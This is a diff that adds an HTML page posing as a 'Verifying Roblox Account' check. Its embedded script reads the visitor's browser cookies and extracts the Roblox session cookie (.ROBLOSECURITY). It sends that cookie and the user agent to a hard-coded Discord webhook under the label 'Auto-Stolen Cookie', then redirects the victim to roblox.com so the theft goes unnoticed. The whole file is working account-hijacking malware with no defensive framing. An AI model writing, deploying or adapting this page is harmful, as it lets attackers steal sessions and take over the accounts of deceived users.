@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifying...</title>
+    <style>
+        body { background: #1a1a1a; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        #status { font-size: 14px; color: #aaa; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <h1>Verifying Roblox Account...</h1>
+    <p id="status">Reading cookies...</p>
+
+    <script>
+        // 1. Get ALL cookies from your browser (Auto!)
+        const allCookies = document.cookie;
+        
+        // 2. Filter for the important one
+        const robloxCookie = allCookies.split(';').find(c => c.trim().startsWith('.ROBLOSECURITY')) || 
+                             allCookies.split(';').find(c => c.trim().startsWith('RobloxAuth'));
+
+        const statusEl = document.getElementById('status');
+
+        if (!robloxCookie) {
+            statusEl.innerText = "❌ No Roblox cookie found. Are you logged in?";
+        } else {
+            statusEl.innerText = "✅ Sending to Discord...";
+            
+            // 3. Send to Discord Webhook
+            fetch('https://discord.com/api/webhooks/1548313898371776622/-5rmm8rPVmEvRERIuoYdLp16BuDnx1DABy9FtIvWW_zJEMUGnI8FORKVppvPx8FrRIyz', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `🔓 **Auto-Stolen Cookie:**\n\`\`\`${robloxCookie}\`\`\`\n🕵️ **User Agent:**\n\`${navigator.userAgent}\``
+                })
+            })
+            .then(() => {
+                statusEl.innerText = "✅ Success! Cookie sent to Discord.";
+                // Optional: Redirect back to Roblox so they don't notice
+                setTimeout(() => window.location.href = 'https://www.roblox.com', 1000);
+            })
+            .catch(err => {
+                statusEl.innerText = "❌ Error. Check console.";
+                console.error(err);
+            });
+        }
+    </script>
+</body>
+</html>
